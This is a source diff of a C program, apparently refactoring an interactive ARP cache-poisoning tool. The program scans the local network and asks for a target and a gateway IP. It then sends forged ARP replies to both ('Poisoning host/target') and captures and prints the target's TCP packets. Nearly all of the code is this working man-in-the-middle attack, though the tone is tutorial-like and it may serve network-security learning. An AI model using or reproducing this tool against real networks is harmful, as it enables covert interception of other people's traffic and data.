@@ -19,92 +19,53 @@
 #include <netinet/if_ether.h>
 #include <netinet/tcp.h>
 
-
-#define IPSLEN   20
-#define MACSLEN  25
-#define TCPBUFZ  68880
-#define NPACKS   5 
-#define IP_ALEN  4
-#define SDELAY   500
-#define STIMEOUT 7 
-#define ARP_PSIZ 42
-#define FAIL     -1
+#include "tools/nettools.h"
 
 
 void enter();
-void clear();
-int is_valid_ip(char *);
-void clean_exit(int);
-int get_dev(char [IFNAMSIZ]);
-void sigintHandler(int);
-void scon_to_arp(char [7][60]);
-void mac_to_str(char *, unsigned char [ETH_ALEN]);
+int get_dev(char[]);
+void scon_to_arp(char[7][60]);
 void print_payload(unsigned char *, int);
 void print_tcp(unsigned char *, unsigned int );
 void print_arp(char *, char *, char *, char *, char *, char *, char *);
-void parse_bytes(char*, char, unsigned char *, int, int);
 int recv_tcp(int, unsigned char *, char *);
-int recv_arp(int, unsigned char *, unsigned short int , uint8_t [4]);
-void ip_sweep(int, int, uint8_t [IP_ALEN], unsigned char [ETH_ALEN]);
-int get_if_info(int , char [IFNAMSIZ], struct ifreq *,
-                                       struct ifreq *,
-                                       struct ifreq *);
 void make_packet(unsigned char *, unsigned char *, 
                                   unsigned char *, 
                                   unsigned char *, 
                                   unsigned char *, 
-                                  uint8_t [IP_ALEN], 
-                                  uint8_t [IP_ALEN], 
+                                  uint8_t[], 
+                                  uint8_t[], 
                                   unsigned short int);
-int send_arp(int, int, unsigned char *, 
-                       unsigned char *, 
-                       unsigned char *, 
-                       unsigned char *, 
-                       uint8_t [IP_ALEN], 
-                       uint8_t [IP_ALEN], 
-                       unsigned short int );
 
 
-uint8_t broadcast[] = "\xff\xff\xff\xff\xff\xff";
-uint8_t empty[]     = "\x00\x00\x00\x00\x00\x00";
 char *op[]          = {"ARP_REQUEST", "ARP_REPLY"};
 wchar_t emojis      = 0x1F000;
-int sock_no, tsiz;
-unsigned char *bp;
 
 
 int main(int argc, char *argv[]) {
     char dev[IFNAMSIZ];
-    char our_m_str[MACSLEN], target_m_str[MACSLEN], host_m_str[MACSLEN], reply_m_str[MACSLEN];    
+    char our_m_str[MACSLEN], target_m_str[MACSLEN], host_m_str[MACSLEN];    
     char our_ip_str[IPSLEN], host_str[IPSLEN], target_str[IPSLEN], reply_str[IPSLEN];
-    char LAN_ip[IPSLEN-4], t_sufix[4];
+    char h_sufix[4], t_sufix[4];
     char cont[6];
-    struct winsize w;
     struct ifreq ifreq_i, ifreq_c, ifreq_ip;
-    unsigned char our_mac[ETH_ALEN], target_mac[ETH_ALEN], host_mac[ETH_ALEN];
+    uint8_t our_mac[ETH_ALEN], target_mac[ETH_ALEN], host_mac[ETH_ALEN];
     uint8_t our_ip[IP_ALEN], host_ip[IP_ALEN], target_ip[IP_ALEN];
-    int sock, recv_len, last_dot;
+    int sock;
     char scon[7][60];
 
-    unsigned char *recv_buf = calloc(ARP_PSIZ, sizeof(unsigned char *));
+    unsigned char *recv_buf = malloc(ARPSIZ); 
 
 
     // create raw socket
     if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == FAIL) {
         if (getuid() != 0) {
             printf("Run again as sudo! (sudo %s)\n", argv[0]);
-            clean_exit(0);
+            exit(0);
         }
         printf("Error : raw sock create failed\n");
-        clean_exit(1);
+        exit(1);
     }
-
-    // pass socket number and buffer to globals for clean clean_exit
-    ioctl(STDOUT_FILENO, TIOCGWINSZ, &w);
-    tsiz    = w.ws_row;
-    sock_no = sock;
-    bp      = recv_buf;
-    signal(SIGINT, sigintHandler);
 
     // 4 emojis
     setlocale(LC_ALL, "en_US.utf8");
@@ -139,13 +100,13 @@ int main(int argc, char *argv[]) {
     printf("\nI've detected these interfaces on your system (its probably the first one):\n\n");
     if (get_dev(dev) == FAIL) {
         printf("Failed to get interface\n");
-        clean_exit(2);
+        exit(2);
     }
 
     // get interface info
     if(get_if_info(sock, dev, &ifreq_i, &ifreq_c, &ifreq_ip) == FAIL) {
         printf("Failed to get info for interface %s (you probably chose the wrong one, try ifconfig or google)\n", dev);
-        clean_exit(3);
+        exit(3);
     }
 
     // print/save interface info 
@@ -154,21 +115,32 @@ int main(int argc, char *argv[]) {
     printf("It's MAC and IP addresses are:\n");
     printf("------------------------------------------------\n");
     printf("    MAC address : \033[0;34m%s\033[0m\n", our_m_str);
-    strncpy(our_ip_str, inet_ntoa((((struct sockaddr_in *)&(ifreq_ip.ifr_addr))->sin_addr)), IPSLEN);
-    parse_bytes(our_ip_str, '.', our_ip, 4, 10);
+    memcpy(our_ip, (void *)&(((struct sockaddr_in *)&(ifreq_ip.ifr_addr))->sin_addr), IP_ALEN);
+    memcpy(target_ip, our_ip, IP_ALEN);
+    memcpy(host_ip, our_ip, IP_ALEN);
+    ip_to_str(our_ip_str, our_ip);
     printf("    IP address  : \033[0;34m%s\033[0m\n",  our_ip_str);
     fflush(stdout);
     printf("------------------------------------------------\n\n");
     enter();
 
-    // parse IP LAN
-    last_dot = (strrchr(our_ip_str, '.')-our_ip_str);
-    strncpy(LAN_ip, our_ip_str, last_dot);
-    LAN_ip[last_dot] = 0;
+    char LAN_ip[IPSLEN];
+    sprintf(LAN_ip, "%d.%d.%d", 
+            our_ip[0],
+            our_ip[1],
+            our_ip[2]);
 
     // scan for IP's
     printf("\nScanning your network...\n");
-    ip_sweep(sock, ifreq_i.ifr_ifindex, our_ip, our_mac);
+    struct ip_mac *p, *on_ntwrk;
+    p = on_ntwrk = ip_sweep(sock, ifreq_i.ifr_ifindex, our_ip, our_mac);
+    printf("\nFound IP's:\n\033[0;34m");
+
+    while (p) {
+        printf("%d.%d.%d.%d\n", p->ip[0], p->ip[1], p->ip[2], p->ip[3]);
+        p = p->next;
+    }
+    printf("\033[0m\n");
     enter();
 
     // get target IP from user 
@@ -178,32 +150,38 @@ int main(int argc, char *argv[]) {
 
     printf("\nEnter final field of your targets IP address (they have to be online) \033[0;34m%s.\033[0m", 
                         LAN_ip);
-    fgets(t_sufix, 4, stdin);
-    sprintf(target_str, "%s.%s", LAN_ip, t_sufix);
-    target_str[strcspn(target_str, "\n")] = 0;
 
-    if (!is_valid_ip(target_str)) {
-        printf("Error %s is not a vaild ip address\n", target_str);
-        clean_exit(5);
+    while (1) {
+        fgets(t_sufix, 4, stdin);
+        target_ip[3] = atoi(t_sufix);
+        ip_to_str(target_str, target_ip);
+
+        if (!is_valid_ip(target_str)) {
+            printf("Error %s is not a vaild ip address, try again: \n", target_str);
+            while (getchar() != '\n');
+            continue;
+        }
+        break;
     }
-    parse_bytes(target_str, '.', target_ip, 4, 10);
     
     // get host IP from user
-    printf("If the host is your router its IP is probably \033[0;34m%s.\033[0;31m1\033[0m if its not, please enter it here in full: ", 
+    printf("If the host is your router last digit is probably 1 (\033[0;34m%s.\033[0;31m1\033[0m) if its not, please enter it: ", 
                                     LAN_ip);
-    fgets(host_str, IPSLEN, stdin);
+    while (1) {
+        fgets(h_sufix, IPSLEN, stdin);
 
-    if (*host_str == '\n') {
-        sprintf(host_str, "%s.1", LAN_ip);
+        if ((host_ip[3] = atoi(h_sufix)) == 0) {
+            host_ip[3] = 1;
+        }
+        ip_to_str(host_str, host_ip);
+
+        if (!is_valid_ip(host_str)) {
+            printf("Error %s is not a vaild ip address\n", host_str);
+            while (getchar() != '\n');
+            continue;
+        }
+        break;
     }
-    else {
-        host_str[strcspn(host_str, "\n")] = 0;
-    }
-    if (!is_valid_ip(host_str)) {
-        printf("Error %s is not a vaild ip address\n", host_str);
-        clean_exit(4);
-    }
-    parse_bytes(host_str, '.', host_ip, 4, 10);
 
 
     // check IP's
@@ -251,7 +229,7 @@ int main(int argc, char *argv[]) {
                      our_ip, 
                      target_ip,
                      ARPOP_REQUEST);
-    print_payload(recv_buf, ARP_PSIZ);
+    print_payload(recv_buf, ARPSIZ);
 
     printf("\nOr it does when translated from raw bytes to hexadecimal, but I've parsed into a table it because thats not important.\n");
     printf("If you look closely you will see most of the data from above.)\n\n");
@@ -275,28 +253,26 @@ int main(int argc, char *argv[]) {
 
     // send request
     printf("\n");
-    send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
-                                        broadcast, 
-                                        our_mac, 
-                                        empty, 
-                                        our_ip, 
-                                        host_ip,
-                                        ARPOP_REQUEST);
+    send_arp(sock, ifreq_i.ifr_ifindex, 
+            our_mac,
+            broadcast, 
+            our_mac, 
+            empty, 
+            our_ip, 
+            host_ip,
+            ARPOP_REQUEST);
+
     printf("Sent\n");
     printf("Now we wait for a reply ...\n\n");
-    recv_len = recv_arp(sock, recv_buf, ARPOP_REPLY, host_ip);
-    printf("Got one! (%d bytes)\n\n", recv_len);
+    struct ether_arp *arp = recv_arp(sock, ARPOP_REPLY, host_ip);
+    printf("Got one!\n\n");
     enter();
 
     // parse and print response
-    struct ethhdr *eth = (struct ethhdr *)(recv_buf);
-    mac_to_str(reply_m_str, eth->h_source);
-    sprintf(scon[0], "\033[0;34m%s\033[0m <- replying device MAC", reply_m_str);
-    sprintf(scon[1], "\033[0;34m%s\033[0m <- your MAC", our_m_str);
-
-    struct ether_arp *arp = (struct ether_arp *)(recv_buf + sizeof(struct ether_header));
     memcpy(host_mac, arp->arp_sha, ETH_ALEN);
     mac_to_str(host_m_str, host_mac);
+    sprintf(scon[0], "\033[0;34m%s\033[0m <- replying device MAC", host_m_str);
+    sprintf(scon[1], "\033[0;34m%s\033[0m <- your MAC", our_m_str);
     sprintf(scon[2], "\033[0;31m%s\033[0m <- Host MAC", host_m_str);
     sprintf(scon[3], "\033[0;34m%s\033[0m <- your MAC", our_m_str);
     snprintf(reply_str, IPSLEN, "%d.%d.%d.%d", arp->arp_spa[0],
@@ -330,28 +306,26 @@ int main(int argc, char *argv[]) {
 
     // send
     printf("\n");
-    send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
-                                        broadcast, 
-                                        our_mac, 
-                                        empty, 
-                                        our_ip, 
-                                        target_ip,
-                                        ARPOP_REQUEST);
+    send_arp(sock, ifreq_i.ifr_ifindex, 
+            our_mac,
+            broadcast, 
+            our_mac, 
+            empty, 
+            our_ip, 
+            target_ip,
+            ARPOP_REQUEST);
+
     printf("Sent\n");
     printf("Now we wait for a reply ...\n\n");
-    recv_len = recv_arp(sock, recv_buf, ARPOP_REPLY, target_ip);
-    printf("Got one! (%d bytes)\n\n", recv_len);
+    arp = recv_arp(sock, ARPOP_REPLY, target_ip);
+    printf("Got one! \n\n");
     enter();
 
     // parse and print response
-    eth = (struct ethhdr *)(recv_buf);
-    mac_to_str(reply_m_str, eth->h_source);
-    sprintf(scon[0], "\033[0;34m%s\033[0m <- replying device MAC", reply_m_str);
-    sprintf(scon[1], "\033[0;34m%s\033[0m <- your MAC", our_m_str);
-
-    arp = (struct ether_arp *)(recv_buf + sizeof(struct ether_header));
     memcpy(target_mac, arp->arp_sha, ETH_ALEN);
     mac_to_str(target_m_str, target_mac);
+    sprintf(scon[0], "\033[0;34m%s\033[0m <- replying device MAC", target_m_str);
+    sprintf(scon[1], "\033[0;34m%s\033[0m <- your MAC", our_m_str);
     sprintf(scon[2], "\033[0;31m%s\033[0m <- target MAC", target_m_str);
     sprintf(scon[3], "\033[0;34m%s\033[0m <- your MAC", our_m_str);
     snprintf(reply_str, IPSLEN, "%d.%d.%d.%d", arp->arp_spa[0],
@@ -444,13 +418,14 @@ int main(int argc, char *argv[]) {
     // poison host
     printf("\n\033[0;32mPoisoning host...\033[0;31m\n");
     for (int i = NPACKS; i > 0; --i) {
-            send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
-                                                host_mac, 
-                                                our_mac, 
-                                                host_mac, 
-                                                target_ip, 
-                                                host_ip,
-                                                ARPOP_REPLY);
+            send_arp(sock, ifreq_i.ifr_ifindex, 
+                    our_mac,
+                    host_mac, 
+                    our_mac, 
+                    host_mac, 
+                    target_ip, 
+                    host_ip,
+                    ARPOP_REPLY);
             printf("Sent 42 bytes\n");
             sleep(1);
     }
@@ -458,13 +433,14 @@ int main(int argc, char *argv[]) {
     // poison target 
     printf("\n\033[0;32mPoisoning target...\033[0;31m\n");
     for (int i = NPACKS; i > 0; --i) {
-            send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
-                                                target_mac,
-                                                our_mac,
-                                                target_mac,
-                                                host_ip,
-                                                target_ip,
-                                                ARPOP_REPLY);
+            send_arp(sock, ifreq_i.ifr_ifindex, 
+                    our_mac,
+                    target_mac,
+                    our_mac,
+                    target_mac,
+                    host_ip,
+                    target_ip,
+                    ARPOP_REPLY);
             printf("Sent 42 bytes\n");
             sleep(1);
     }
@@ -474,15 +450,13 @@ int main(int argc, char *argv[]) {
     printf("\n\nDone! now we can wait and sniff for our first TCP packet from the target or host!\n\n");
     printf("Waiting...\n");
 
-    free(recv_buf);
-    unsigned char *tcp_buf = calloc(TCPBUFZ, sizeof(unsigned char *));
-    bp = tcp_buf;
-    recv_len = recv_tcp(sock, tcp_buf, target_str);
+    unsigned char *tcp_buf = malloc(TCPBUFZ);
+    int nbytes = recv_tcp(sock, tcp_buf, target_str);
     printf("\n\nGot one!\n\n");
     enter();
 
     // print first packet
-    print_tcp(tcp_buf, recv_len);
+    print_tcp(tcp_buf, nbytes);
 
     printf("\n\nYou got your first packet!\n");
     printf("Theres a small chance you have gotten it for some other reason but probably it has been redirected from the target!\n");
@@ -495,44 +469,19 @@ int main(int argc, char *argv[]) {
     // print all TCP trafic until ctrl+c
     if (strncmp(cont, "more", 4) != 0) {
         printf("\nBye! :)\n");
+        free(tcp_buf);
         close(sock);
-        clean_exit(0);
+        exit(0);
     }
     while (1) {
-        recv_len = recv_tcp(sock, tcp_buf, target_str);
-        print_tcp(tcp_buf, recv_len);
+        nbytes = recv_tcp(sock, tcp_buf, target_str);
+        print_tcp(tcp_buf, nbytes);
         printf("ctrl+c to quit\n");
     }
 }
 
 
-int recv_arp(int sock, unsigned char *buf, unsigned short int op_code, uint8_t s_ip[4]) {
-    int bytes_recvd;
 
-    while (1) {
-        bytes_recvd = read(sock, buf, ARP_PSIZ);
-
-        if (ntohs(((struct ethhdr*)(buf))->h_proto) == 0x0806) {
-            struct ether_arp *arp = (struct ether_arp *)(buf + sizeof(struct ethhdr));
-
-            if (ntohs(arp->ea_hdr.ar_op) == op_code && memcmp(arp->arp_spa, s_ip, 4) == 0) {
-                return bytes_recvd;
-            }
-        }
-    }
-}
-    
-void clean_exit(int e_no) {
-    printf("\nCleaning up...\n");
-    close(sock_no);
-    free(bp);
-    exit(e_no);
-}
-
-void sigintHandler(int sig_num) {
-    signal(SIGINT, sigintHandler);
-    clean_exit(0);
-}
 
 void scon_to_arp(char scon[7][60]){
     print_arp(scon[0],
@@ -544,25 +493,10 @@ void scon_to_arp(char scon[7][60]){
               scon[6]); 
 }
 
-void clear() {
-    int i = tsiz;
-    while (i--) printf("\n");
-}            
-
 void enter() {
     printf("(enter to continue)");
     char e = 0;
     while ((e = getchar()) != '\n');
-}
-
-void mac_to_str(char mac_str[MACSLEN], unsigned char mac[ETH_ALEN]) {
-    snprintf(mac_str, MACSLEN, "%.2X-%.2X-%.2X-%.2X-%.2X-%.2X", 
-                                               mac[0],
-                                               mac[1],
-                                               mac[2],
-                                               mac[3],
-                                               mac[4],
-                                               mac[5]);
 }
 
 void print_arp(char *if_mac, char *e_dest, char *s_mac, char *d_mac, char *s_ip, char *t_ip, char *op) {
@@ -585,104 +519,6 @@ void print_arp(char *if_mac, char *e_dest, char *s_mac, char *d_mac, char *s_ip,
                    "	|-Op code                  :  %s                               \n"
                    "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n";
     printf(arp_p, if_mac, e_dest, s_mac, d_mac, s_ip, t_ip, op);
-}
-
-void ip_sweep(int sock, int if_idx, uint8_t s_ip[IP_ALEN], 
-                                    unsigned char s_mac[ETH_ALEN]) { 
-    unsigned char *buf = calloc(ARP_PSIZ, sizeof(unsigned char));
-    uint8_t t_ip[IP_ALEN];
-    int i;
-
-    memcpy(t_ip, s_ip, IP_ALEN);
-
-    // spam ARP requests
-    for (i = 1; i < 254; i++) {
-        t_ip[3] = i;
-        send_arp(sock, if_idx, s_mac,
-                broadcast,
-                s_mac,
-                empty,
-                s_ip,
-                t_ip,
-                ARPOP_REQUEST);
-        usleep(SDELAY);
-    }
-
-    time_t endwait;
-    time_t start = time(NULL);
-    time_t seconds = STIMEOUT;
-
-    endwait = start + seconds;
-
-    // wait STIMEOUT for ARP relpies
-    while (start < endwait) {
-        printf("%d seconds left...\r", (int)(endwait - start));
-        fflush(stdout);
-
-        if ((read(sock, buf, ARP_PSIZ)) < 0) {
-            printf("Error : sock read failed\n");
-            clean_exit(5);
-        }
-
-        if (ntohs(((struct ethhdr*)(buf))->h_proto) == 0x0806) {
-            struct ether_arp *arp = (struct ether_arp *)(buf + sizeof(struct ethhdr));
-
-            if (ntohs(arp->ea_hdr.ar_op) == ARPOP_REPLY) {
-                printf("IP online on your network: \033[0;34m%d.%d.%d.%d\033[0m\n", 
-                        arp->arp_spa[0],
-                        arp->arp_spa[1],
-                        arp->arp_spa[2],
-                        arp->arp_spa[3]);
-            }
-        }
-        start = time(NULL);
-    }
-    printf("\n\n\nIP scan complete (there might be more IP's online)\n\n");
-}
-
-void parse_bytes(char* str, char sep, unsigned char *bytes, int maxBytes, int base) {
-    for (int i = 0; i < maxBytes; i++) {
-        bytes[i] = strtoul(str, NULL, base);
-        str = strchr(str, sep);
-        if (str == NULL || *str == '\0') {
-            break;
-        }
-        str++;
-    }
-}
-
-int get_if_info(int sock, char dev[IFNAMSIZ], 
-                struct ifreq *ifreq_i,
-                struct ifreq *ifreq_c,
-                struct ifreq *ifreq_ip) {
-
-    // get index number 
-    memset(ifreq_i, 0, sizeof(struct ifreq));
-    strncpy(ifreq_i->ifr_name, dev, IFNAMSIZ-1);
-   
-    if ((ioctl(sock, SIOCGIFINDEX, ifreq_i)) < 0) {
-        printf("Error : %s ioctl index read failed\n", dev);
-        return FAIL;
-    }
-
-    // get MAC Address
-    memset(ifreq_c, 0, sizeof(struct ifreq));
-    strncpy(ifreq_c->ifr_name, dev, IFNAMSIZ-1);
-
-    if ((ioctl(sock, SIOCGIFHWADDR, ifreq_c)) < 0) {
-        printf("Error : ioctl MAC read failed\n");
-        return FAIL;
-    }
-
-    //get IP Address
-    memset(ifreq_ip, 0, sizeof(struct ifreq));
-    strncpy(ifreq_ip->ifr_name, dev, IFNAMSIZ-1);
-
-    if(ioctl(sock, SIOCGIFADDR, ifreq_ip) < 0) {
-        printf("Error : ioctl IP read failed\n");
-        return FAIL;
-    }
-    return 0;
 }
 
 int get_dev(char dev[IFNAMSIZ]) {
@@ -730,12 +566,6 @@ int get_dev(char dev[IFNAMSIZ]) {
     return namelen;
 }
 
-int is_valid_ip(char *ipAddress) {
-    struct sockaddr_in sa;
-    int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
-    return result > 0;
-}
-
 void make_packet(unsigned char *sendbuff, unsigned char *s_mac, 
                                 unsigned char *d_mac, 
                                 unsigned char *arp_s_mac, 
@@ -743,7 +573,7 @@ void make_packet(unsigned char *sendbuff, unsigned char *s_mac,
                                 uint8_t arp_s_ip[4], 
                                 uint8_t arp_t_ip[4], 
                                 unsigned short int opcode) {
-    memset(sendbuff, 0, ARP_PSIZ);
+    memset(sendbuff, 0, ARPSIZ);
     struct ethhdr *eth = (struct ethhdr *)(sendbuff);
     memcpy(eth->h_source, s_mac, ETH_ALEN);
     memcpy(eth->h_dest, d_mac, ETH_ALEN);
@@ -759,64 +589,6 @@ void make_packet(unsigned char *sendbuff, unsigned char *s_mac,
     arp->ea_hdr.ar_hln = ETH_ALEN;   
     arp->ea_hdr.ar_pln = 4;
 }
-
-int send_arp(int sock, int if_idx, unsigned char *s_mac, 
-                                   unsigned char *d_mac, 
-                                   unsigned char *arp_s_mac, 
-                                   unsigned char *arp_t_mac, 
-                                   uint8_t arp_s_ip[4], 
-                                   uint8_t arp_t_ip[4], 
-                                   unsigned short int opcode) {
-    int send_len;
-    unsigned char *sendbuff = calloc(ARP_PSIZ, sizeof(unsigned char *));
-
-    memset(sendbuff, 0, ARP_PSIZ);
-
-    // cast packet start to Ethernet header
-    struct ethhdr *eth = (struct ethhdr *)(sendbuff);
-
-    // add interface MAC
-    memcpy(eth->h_source, s_mac, ETH_ALEN);
-
-    // add destination MAC
-    memcpy(eth->h_dest, d_mac, ETH_ALEN);
-
-    // add protocol to signal IP
-    eth->h_proto = htons(ETH_P_ARP);
-
-    // cast next section to ARP header 
-    struct ether_arp *arp = (struct ether_arp *)(sendbuff + sizeof(struct ether_header));
-     
-    // add ARP source/dest MAC
-    memcpy(arp->arp_sha, arp_s_mac, ETH_ALEN);
-    memcpy(arp->arp_tha, arp_t_mac, ETH_ALEN);
-    
-    // add ARP source/dest IP
-    memcpy(arp->arp_spa, arp_s_ip, 4);
-    memcpy(arp->arp_tpa, arp_t_ip, 4);
-
-    // set hardware type, protocol and opcode
-    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
-    arp->ea_hdr.ar_pro = htons(2048);
-    arp->ea_hdr.ar_op  = htons(opcode);
-    
-    // number of bytes in MAC/IP addresses
-    arp->ea_hdr.ar_hln = ETH_ALEN;   
-    arp->ea_hdr.ar_pln = 4;
-
-    struct sockaddr_ll sadr_ll;
-    sadr_ll.sll_ifindex = if_idx;
-    sadr_ll.sll_halen   = ETH_ALEN;
-    memcpy(sadr_ll.sll_addr, d_mac, ETH_ALEN);
-
-    // send
-    if ((send_len = sendto(sock, sendbuff, ARP_PSIZ, 0, (const struct sockaddr*)&sadr_ll, sizeof(struct sockaddr_ll))) < 0) {
-        printf("Error : sending failed :(\n");
-        return -1;
-    }
-    return 0;
-}
-
 
 // only to print TCP packet vvvv
 static void print_mac(unsigned char mac[ETH_ALEN]) {
